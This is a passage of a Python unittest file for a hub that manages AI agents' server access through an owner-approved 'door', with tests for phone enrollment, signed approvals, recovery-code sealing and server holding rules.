        with patch.object(hub, "central_ok", lambda t0=None: True), patch.object(hub, "central_call", call), \
                patch.dict(hub.CENTRAL, status=status):
            self.assertEqual(hub.door_reconcile(), [])
            self.assertEqual(asked, [])                         # not signed for the door: nothing is asked
            self.assertEqual(hub.door_sealed(DOOR)["keep"], [])
            status["grants"] = [{"login": self.ref, "agent": "door", "machine": "door"}]
            # The time BEFORE the seal goes with the copy: door_deliver keeps no copy that was sealed before a
            # replace, and a time from after the seal would not see a replace between the seal and the write. The
            # clock here goes one second on at each reading, so the seal has a later time than the reading before it.
            times, sealed, clock = [], [], iter(range(1, 1000))
            start = hub.now()

            def seal(answer, ref, machine, pin):
                sealed.append(hub.now())
                return "armored"
            with patch.object(hub, "now", lambda: start + next(clock)), patch.object(hub, "central_sealed", seal), \
                    patch.object(hub, "door_deliver", lambda ref, text, t0=None: times.append(t0) or 41):
                self.assertEqual(hub.door_reconcile(), [41])
            self.assertTrue(len(times) == 1 and start < times[0] < sealed[0], (times, sealed))
            self.assertEqual(asked, [("seal", {"login": self.ref, "machine": "door"})])
            with patch.object(hub, "central_sealed", lambda answer, ref, machine, pin: "armored"), \
                    patch.object(hub, "door_deliver", lambda ref, text, t0=None: None):
                self.assertEqual(hub.door_reconcile(), [])      # a copy that was not kept is no copy
            self.assertEqual(hub.door_sealed(DOOR)["keep"], [self.ref])
            hub.q("INSERT INTO door_copies(login,sealed,created) VALUES(?,?,?)", (self.ref, "old", hub.now() - 8 * 86400))
            hub.q("INSERT INTO door_copies(login,sealed,created) VALUES(?,?,?)",
                  ("bws://00000002-0000-4000-8000-000000000000", "gone", hub.now()))
            with patch.object(hub, "central_sealed", lambda answer, ref, machine, pin: "armored"), \
                    patch.object(hub, "door_deliver", lambda ref, text, t0=None: 42):
                hub.door_reconcile()
            self.assertEqual(hub.q1("SELECT COUNT(*) n FROM door_copies")["n"], 0)
        with patch.dict(hub.CENTRAL, status=None):
            self.assertIsNone(hub.door_sealed(DOOR)["keep"])    # the vault does not answer: the door keeps all

    def test_the_door_is_no_machine_of_the_fleet(self):
        team = self.origin_team()
        team["door"]["address"] = team["addresses"]["vps"]       # an agent's machine; the hub's own may (1.122)
        with self.assertRaisesRegex(ValueError, "no other machine of the fleet"):
            hub.validate_team(team)
        team["door"] = {"address": DOOR, "secrets": ["bws://00000009-0000-4000-8000-000000000000"]}
        with self.assertRaisesRegex(ValueError, "secrets of the catalog"):
            hub.validate_team(team)

    def test_the_manager_may_propose_the_door_as_the_holder_of_a_new_key(self):
        text = hub.t_request_secret("manager", {"kind": "api_key", "env": "HETZNER_TOKEN",
                                                "site": "https://api.hetzner.cloud", "why": "the door's power cycle",
                                                "give_to": {"door": "use"}, "details": STEPS})
        self.assertNotIn("give_to names workers", text)
        need = hub.q1("SELECT secret FROM needs ORDER BY id DESC LIMIT 1")
        self.assertEqual(json.loads(need["secret"])["give"], {"door": "use"})
        with self.assertRaisesRegex(hub.ToolError, "give_to names workers"):
            hub.t_request_secret("manager", {"kind": "api_key", "env": "OTHER_TOKEN", "site": "https://api.x.com",
                                             "why": "x", "give_to": {"door": "read"}})


class PhoneYes(Devices):
    """DevOps plan 5.4: a phone's own signing key comes with its enrollment, bound by an HMAC to the one-time value of
    the Mac's QR; the Mac certifies it with the owner key; only the door's address reads the certificates."""

    KEY = base64.b64encode(b"\x04" + b"\x11" * 64).decode()
    BINDING = base64.b64encode(b"\x22" * 32).decode()

    def setUp(self):
        super().setUp()
        hub.TEAM["door"] = {"address": DOOR, "port": 8766}
        self.fleet = hub.fleet_id()

    def certificate(self, key=None, device="iphone", fleet=None):
        return json.dumps({"v": 1, "kind": "owner-device", "fleet": fleet or self.fleet, "device": device,
                           "key": key or self.KEY, "at": 1}, sort_keys=True, separators=(",", ":"))

    def certify(self, statement, device="iphone", source=None):
        body = {"request_id": str(uuid.uuid4()), "db": "test-generation", "statement": statement, "signature": "c2ln"}
        return self.call(f"/ui/owner/devices/{device}/certify", body, **({"source": source} if source else {}))

    def test_a_phones_signing_key_comes_with_its_enrollment_and_the_mac_certifies_it(self):
        status, made = self.code()
        self.assertEqual(status, 200, made)
        status, answer = self.call("/ui/owner/enroll", {"code": made["code"], "signing_key": "AAAA",
                                                        "binding": self.BINDING}, source=PHONE)
        self.assertEqual(status, 400, answer)               # a wrong key burns no code
        status, answer = self.call("/ui/owner/enroll", {"code": made["code"], "signing_key": self.KEY,
                                                        "binding": self.BINDING}, source=PHONE)
        self.assertEqual(status, 200, answer)
        phone = next(d for d in self.call("/ui/owner/devices")[1]["devices"] if d["device"] == "iphone")
        self.assertEqual((phone["signing_key"], phone["binding"], phone["certified"]), (self.KEY, self.BINDING, False))
        for wrong in (self.certificate(key=base64.b64encode(b"\x04" + b"\x33" * 64).decode()),
                      self.certificate(fleet="another"), self.certificate() + " "):
            self.assertEqual(self.certify(wrong)[0], 400)
        self.assertEqual(self.certify(self.certificate(), source=PHONE)[0], 403)        # a phone never certifies
        status, answer = self.certify(self.certificate())
        self.assertEqual((status, answer.get("certified")), (200, True), answer)
        self.assertEqual(self.call("/door/approvals")[0], 403)
        status, answer = self.call("/door/approvals", source=DOOR)
        self.assertEqual(answer["devices"], [{"device": "iphone", "statement": self.certificate(),
                                              "signature": "c2ln"}])
        hub.TEAM["owner_devices"] = {}                 # the owner removed the phone: the door no longer reads it
        self.assertEqual(self.call("/door/approvals", source=DOOR)[1]["devices"], [])

    def test_a_phones_yes_counts_only_when_its_own_certified_key_signed_it(self):
        """A yes that the phone's certified key did not sign is never recorded: it gets the unsigned yes's 409, and the
        item stays open, so that a yes from the phone never closes an item that lets nothing through. Since the owner's
        "OpenSSL as a second check" (20 November 2026) the hub checks that signature as the door does, by our ECDSA and
        by OpenSSL, and before the hub's lock: a yes that OpenSSL refuses gets the 409, one that OpenSSL could not check
        is not recorded (503), and an answer kept before the lock counts only for the key and the certificate that the
        lock finds. The certificate's own signature is the door's to check, as the Mac's yes is."""
        from test_vault_central import owner_point, owner_sign
        secret = 0x1D0C0FFEE0B1A5ED5EED0F7E57C0DE0123456789ABCDEF0123456789ABCDEF01
        key = owner_point(secret)
        status, made = self.code()
        self.assertEqual(status, 200, made)
        status, got = self.call("/ui/owner/enroll", {"code": made["code"], "signing_key": key,
                                                     "binding": self.BINDING}, source=PHONE)
        self.assertEqual(status, 200, got)
        call = refusal("c" * 64)
        nid = int(hub.t_raise_needs_you("manager", {"title": "Start the runner", "why": "It adds cost",
                                                    "what_to_do": "Answer yes", "door_call": call,
                                                    "options": ["Yes, run it once", "No"]}).split("N-")[1].split(".")[0])
        yes = json.dumps({"v": 1, "kind": "door-call", "fleet": self.fleet, "need": nid, "call": call,
                          "at": round(hub.now())},
                         sort_keys=True, separators=(",", ":"))

        def answer(signature, db="test-generation"):
            return self.call(f"/ui/needs/{nid}", {"request_id": str(uuid.uuid4()), "db": db,
                                                  "choice": 0, "statement": yes, "signature": signature},
                             source=PHONE, token=got["key"])
        status, said = answer(owner_sign(yes, secret))
        self.assertEqual(status, 409, said)                             # the Mac has not certified the key yet
        self.assertIn("owner key on the Mac", said["error"])
        self.assertEqual(self.certify(self.certificate(key=key))[0], 200)
        self.assertEqual(answer(owner_sign(yes))[0], 409)               # another key signed it
        self.assertIsNone(hub.q1("SELECT answer FROM needs WHERE id=?", (nid,))["answer"])
        import vault
        ran = []

        def openssl(said):                              # this machine's OpenSSL, the second check
            def takes(point, message, signature):
                ran.append(hub.LOCK._is_owned())
                return said
            return patch.object(vault, "openssl_takes", takes)
        with openssl(False):                            # OpenSSL refuses what our ECDSA takes
            self.assertEqual(answer(owner_sign(yes, secret))[0], 409)
        with openssl(None):                             # OpenSSL could not be asked this time
            status, said = answer(owner_sign(yes, secret))
        self.assertEqual((status, said.get("code")), (503, "signature_unchecked"), said)
        self.assertEqual(ran, [False, False])           # each check ran once, and before the hub's lock
        self.assertIsNone(hub.q1("SELECT answer FROM needs WHERE id=?", (nid,))["answer"])
        good = owner_sign(yes, secret)                  # kept as True before the lock, which then finds another hub
        with openssl(True):
            self.assertEqual(answer(good, db="another-generation")[0], 409)
        row = hub.q1("SELECT key, statement FROM owner_device_signing")
        for column, value in (("statement", None), ("key", owner_point(secret + 1))):  # no certificate, a new key
            hub.q(f"UPDATE owner_device_signing SET {column}=?", (value,))
            self.assertEqual(answer(good)[0], 409, column)
            hub.q(f"UPDATE owner_device_signing SET {column}=?", (row[column],))
        real = hub.owner_device_at                      # the owner removes the phone between the check and the lock
        with patch.object(hub, "owner_device_at", lambda address: None if hub.LOCK._is_owned() else real(address)):
            status, said = answer(owner_sign(yes, secret))
        self.assertEqual((status, said.get("code")), (403, "not_owner_device"), said)  # what it sent changes nothing
        self.assertIsNone(hub.q1("SELECT answer FROM needs WHERE id=?", (nid,))["answer"])
        status, said = answer(owner_sign(yes, secret))
        self.assertEqual(status, 200, said)
        self.assertIsNotNone(hub.q1("SELECT approval FROM needs WHERE id=?", (nid,))["approval"])

    def test_a_phone_never_sets_full_access(self):
        """Whether the phone sets a server's mode is the owner's decision 3, which is open: the phone's certified key
        signs a yes to a door call, and no Full access. Its answer gets the 409 of an unsigned answer, and the item
        stays open."""
        from test_vault_central import owner_point, owner_sign
        secret = 0x2D0C0FFEE0B1A5ED5EED0F7E57C0DE0123456789ABCDEF0123456789ABCDEF02
        status, made = self.code()
        self.assertEqual(status, 200, made)
        status, got = self.call("/ui/owner/enroll", {"code": made["code"], "signing_key": owner_point(secret),
                                                     "binding": self.BINDING}, source=PHONE)
        self.assertEqual(status, 200, got)
        self.assertEqual(self.certify(self.certificate(key=owner_point(secret)))[0], 200)
        hub.TEAM["agents"]["ops"] = {"role": "worker", "runtime": "claude", "machine": "hub", "can": [],
                                     "servers": {"web-1": "fix"}}         # the agent that holds web-1 at Fix
        nid = int(hub.t_raise_needs_you("manager", run_card()).split("N-")[1].split(".")[0])
        mode = json.dumps({"v": 1, "kind": "door-mode", "fleet": self.fleet, "host": "web-1", "mode": "full",
                           "at": 1}, sort_keys=True, separators=(",", ":"))
        mode_now = mode.replace('"at":1', f'"at":{round(hub.now())}')
        for statement in (mode, None):
            body = {"request_id": str(uuid.uuid4()), "db": "test-generation", "choice": 1}
            if statement:
                body.update(statement=statement, signature=owner_sign(statement, secret))
            status, said = self.call(f"/ui/needs/{nid}", body, source=PHONE, token=got["key"])
            self.assertEqual(status, 409, said)
            self.assertIn("owner key on the Mac", said["error"])
        self.assertIsNone(hub.q1("SELECT answer FROM needs WHERE id=?", (nid,))["answer"])
        # nor from the server's own row (owner feature door_mode_set), Auto as little as Full access: the route is
        # none of a device's, and it refuses a device's address by itself too
        for mode in ("full", "auto"):
            statement = mode_now.replace('"full"', f'"{mode}"')
            status, said = self.call("/ui/door/mode", {"request_id": str(uuid.uuid4()), "db": "test-generation",
                                                       "host": "web-1", "statement": statement,
                                                       "signature": owner_sign(statement, secret)},
                                     source=PHONE, token=got["key"])
            self.assertEqual((status, said.get("auth")), (403, "device_not_allowed"), said)
        self.assertEqual(hub.door_modes_held(), {})

    def test_an_item_with_a_door_call_names_the_fleet_for_a_phones_statement(self):
        nid = int(hub.t_raise_needs_you("manager", {"title": "Start the runner", "why": "It adds cost",
                                                    "what_to_do": "Answer yes", "door_call": refusal("c" * 64),
                                                    "options": ["Yes, run it once", "No"]}).split("N-")[1].split(".")[0])
        item = hub.need_view(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))
        self.assertEqual(item["door_fleet"], self.fleet)
        plain = hub.t_raise_needs_you("manager", {"title": "Which name", "why": "The owner names it",
                                                  "what_to_do": "Answer with a name", "reason": "person"})
        item = hub.need_view(hub.q1("SELECT * FROM needs WHERE id=?", (int(plain.split("N-")[1].split(".")[0]),)))
        self.assertIsNone(item["door_fleet"])



class PhoneRecoveryCopy(Devices):
    """DevOps plan V12 (the coordinator, 6 November 2026): the recovery code gets a copy off the owner's Mac with no
    step of his. A newer phone sends a second key of its own with its enrollment, bound to the same one-time value of
    the Mac's QR; the Mac seals the code to it; the hub carries only the sealed box, until that phone says that it
    holds the code; then the hub keeps only that time. Nothing of it is on his screen."""

    KEY = base64.b64encode(b"\x04" + b"\x11" * 64).decode()
    BINDING = base64.b64encode(b"\x22" * 32).decode()
    RECOVERY = base64.b64encode(b"\x04" + b"\x55" * 64).decode()
    SEALED = base64.b64encode(b"\x04" + b"\x66" * 64 + b"\x77" * 12 + b"\x88" * 42).decode()

    def enroll_with(self, **more):
        status, made = self.code()
        self.assertEqual(status, 200, made)
        return self.call("/ui/owner/enroll", dict({"code": made["code"], "signing_key": self.KEY,
                                                   "binding": self.BINDING}, **more), source=PHONE)

    def phone(self):
        return next(d for d in self.call("/ui/owner/devices")[1]["devices"] if d["device"] == "iphone")

    def box(self, sealed=None, source=None):
        body = {"request_id": str(uuid.uuid4()), "db": "test-generation", "sealed": sealed or self.SEALED}
        return self.call("/ui/owner/devices/iphone/recovery", body, **({"source": source} if source else {}))

    def test_the_phone_takes_its_copy_once_and_the_hub_keeps_only_the_time(self):
        for wrong in ({"recovery_key": self.KEY, "recovery_binding": self.BINDING},       # the signing key again
                      {"recovery_key": "AAAA", "recovery_binding": self.BINDING},
                      {"recovery_key": self.RECOVERY}):
            status, answer = self.enroll_with(**wrong)
            self.assertEqual(status, 400, answer)
        status, got = self.enroll_with(recovery_key=self.RECOVERY, recovery_binding=self.BINDING)
        self.assertEqual(status, 200, got)
        phone = self.phone()
        self.assertEqual((phone["recovery_key"], phone["recovery_binding"], phone["recovery"]),
                         (self.RECOVERY, self.BINDING, None))
        self.assertEqual(self.box(source=PHONE)[0], 403)                 # a phone never writes its own box
        self.assertEqual(self.box(sealed="AAAA")[0], 400)
        status, answer = self.box()
        self.assertEqual((status, answer.get("sealed")), (200, True), answer)
        self.assertEqual(self.phone()["recovery"], {"sealed": True, "held": None})
        self.assertEqual(self.call("/ui/owner/devices/iphone/recovery?db=test-generation")[0], 403)   # not the Mac
        status, answer = self.call("/ui/owner/devices/iphone/recovery?db=test-generation", token=got["key"],
                                   source=PHONE)
        self.assertEqual((status, answer["sealed"]), (200, self.SEALED), answer)
        held = {"request_id": str(uuid.uuid4()), "db": "test-generation"}
        self.assertEqual(self.call("/ui/owner/devices/iphone/recovery/held", held)[0], 403)   # from the phone alone
        status, answer = self.call("/ui/owner/devices/iphone/recovery/held", dict(held, request_id=str(uuid.uuid4())),
                                   token=got["key"], source=PHONE)
        self.assertEqual((status, answer.get("held")), (200, True), answer)
        copy = self.phone()["recovery"]
        self.assertEqual(copy["sealed"], False)
        self.assertIsNotNone(copy["held"])
        self.assertIsNone(self.call("/ui/owner/devices/iphone/recovery?db=test-generation", token=got["key"],
                                    source=PHONE)[1]["sealed"])
        self.assertEqual(hub.q1("SELECT sealed FROM owner_device_recovery WHERE device='iphone'")["sealed"], None)
        again = self.call("/ui/owner/devices/iphone/recovery/held", dict(held, request_id=str(uuid.uuid4())),
                          token=got["key"], source=PHONE)
        self.assertEqual(again[0], 409, again)
        status, got = self.enroll_with()                                   # an older build: no recovery key
        self.assertEqual(status, 200, got)
        self.assertEqual((self.phone()["recovery_key"], self.phone()["recovery"]), (None, None))
        self.assertEqual(self.box()[0], 404)

    def test_an_item_that_opens_the_add_device_picture(self):
        options = ["Show the picture", "Not now"]
        base = {"title": "Your phone enrolls again", "why": "Its copy of the recovery code needs it.",
                "what_to_do": "Press Show the picture on your Mac, and scan it with your phone."}
        for wrong in ({"add_device": True}, {"add_device": "yes", "options": options},
                      {"add_device": True, "options": options, "door_call": "c" * 64}):
            with self.assertRaises(hub.ToolError):
                hub.t_raise_needs_you("manager", dict(base, **wrong))
        said = hub.t_raise_needs_you("manager", dict(base, add_device=True, options=options))
        self.assertIn("opens the Add device picture", said)
        need = hub.q1("SELECT * FROM needs ORDER BY id DESC LIMIT 1")
        self.assertEqual(hub.need_view(need)["add_device"], 1)


class AppServers(Access):
    """Servers for apps (UI-API.md 1.122, the owner's yes of 11 November 2026 to "Server access from the app alone"):
    the door may run on the hub's server, the manager may hold a business's servers, a holder's server takes no
    second agent, /ui/servers lists the servers for apps, and a server that the owner added is no canary."""

    def told(self, words):
        return [r["text"] for r in hub.q("SELECT text FROM events WHERE agent='manager' AND text LIKE ?",
                                         (f"%{words}%",))]

    def test_the_feature_is_offered(self):
        self.assertIn("servers_for_apps", self.request(source=OWNER)[1]["ui_features"])

    def test_the_door_may_run_on_the_hub_s_server_and_on_no_other_machine_of_the_fleet(self):
        team = self.origin_team()
        team["door"] = {"address": team["addresses"]["hub"], "port": 8766}
        hub.validate_door(team)
        team["door"]["address"] = team["addresses"]["vps"]
        with self.assertRaisesRegex(ValueError, "on a server of its own or on the hub's server, and on no other "
                                                "machine of the fleet"):
            hub.validate_door(team)

    def test_the_manager_holds_a_server_and_its_start_text_names_it(self):
        status, receipt = self.grant(agent="manager", server="web-1", level="fix")
        self.assertEqual((status, receipt["level"], receipt["mode"]), (200, "fix", "fix"), receipt)
        self.assertEqual(self.origin_team()["agents"]["manager"]["servers"], {"web-1": "fix"})
        self.assertEqual(hub.fix_holders(hub.TEAM, "web-1"), ["manager"])
        self.assertIn("`ops <server> <action>`", " ".join(hub.holdings_parts("manager")))
        self.assertIn("web-1 (fix)", " ".join(hub.holdings_parts("manager")))

    def test_an_agent_that_shares_its_server_gets_no_server_through_the_door(self):
        """The reverse of the rule below: the door knows a caller by its server's address alone, so the agent beside
        a holder on one server would be the holder to the door. The grant is refused while the agent shares its
        server; taking a holding back is never refused."""
        team = self.origin_team()
        team["agents"]["lead"]["machine"] = "vps"                   # a second agent on the server of vps
        team["agents"]["vps"]["servers"] = {"web-9": "read"}        # a holding from before the rule
        self.write_team(team)
        status, answer = self.grant(level="fix")
        self.assertEqual(status, 409, answer)
        self.assertIn("the door knows a caller by its server's address", answer["error"])
        self.assertNotIn("web-1", self.origin_team()["agents"]["vps"]["servers"])
        status, receipt = self.grant(server="web-9", level=None)
        self.assertEqual((status, receipt.get("changed")), (200, True), receipt)

    def test_a_holder_s_server_takes_no_second_agent(self):
        self.joined("box", "linux", source=OTHER, user="fleet")
        team = self.origin_team()
        team["agents"]["scout"] = {"role": "worker", "runtime": "codex", "machine": "box", "can": ["shell"],
                                   "servers": {"web-1": "fix"}}
        self.write_team(team)
        # a server service that gives a second agent its key, so that only the door's rule can refuse one
        self.assertEqual(self.reading("box", source=OTHER, os_name="Ubuntu 24.04.1 LTS",
                                      features=[hub.INSTALL_KEY])[0], 200)
        view, servers = self.servers()
        self.assertIn("door_caller", servers["box"]["why"])
        self.assertNotIn("door_caller", servers["vps"]["why"])
        status, answer = self.add_agent("box", "second", "codex")
        self.assertEqual(status, 409, answer)
        self.assertIn("holds servers through the door and runs alone on box", answer["error"])

    def test_the_servers_for_apps_are_listed_with_their_holders_and_the_door_s_word(self):
        self.grant(agent="manager", server="web-1", level="fix")
        self.grant(agent="vps", server="mac-studio", level="fix")       # a machine of the fleet: not for apps
        self.assertEqual(self.owner("/ui/door/host", host="shop-1", state="installed", said="", added=True)[0], 200)
        view, servers = self.servers()
        apps = {a["name"]: a for a in view["apps"]}
        self.assertEqual(sorted(apps), ["shop-1", "web-1"])
        self.assertNotIn("web-1", servers)
        self.assertEqual(apps["web-1"]["holders"], [{"agent": "manager", "level": "fix"}])
        self.assertIsNone(apps["web-1"]["door"])
        self.assertEqual(apps["shop-1"]["holders"], [])
        self.assertEqual({k: apps["shop-1"]["door"][k] for k in ("state", "added")}, {"state": "installed", "added": True})
        # Remove server: the app took the door's parts off, so the server leaves the list
        status, got = self.owner("/ui/door/host", host="shop-1", state="removed", said="")
        self.assertEqual((status, got["changed"]), (200, True), got)
        self.assertEqual([a["name"] for a in self.servers()[0]["apps"]], ["web-1"])
        self.assertEqual(self.owner("/ui/door/host", host="shop-1", state="removed", said="")[1]["changed"], False)
        self.assertEqual(self.owner("/ui/door/host", host="shop-1", state="passed", said="", added="yes")[0], 400)

    def test_a_server_that_the_owner_added_is_no_canary(self):
        self.grant(agent="manager", server="shop-1", level="fix")
        for state in ("installed", "passed"):
            status, got = self.owner("/ui/door/host", host="shop-1", state=state, said="", added=True)
            self.assertEqual((status, got["changed"]), (200, True), got)
        self.assertEqual(self.told("call door_rollout"), [])
        self.assertIsNone(hub.door_waits_after())
        self.assertIn("Manager holds it through the door: `ops shop-1 help` lists its forms.",
                      self.told("The owner added shop-1 for apps")[-1])
        self.owner("/ui/door/host", host="shop-2", state="failed", said="ubuntu 22.04 is not covered", added=True)
        self.assertEqual(self.told("the parts on no other server"), [])
        self.assertIn("ubuntu 22.04 is not covered", self.told("which the owner added for apps")[-1])
        # a server that the app finds by its tags is still the canary
        self.owner("/ui/door/host", host="ci-1", state="passed", said="")
        self.assertEqual(hub.door_waits_after(), "ci-1")
        self.assertEqual(len(self.told("call door_rollout with go true")), 1)


if __name__ == "__main__":
    unittest.main()
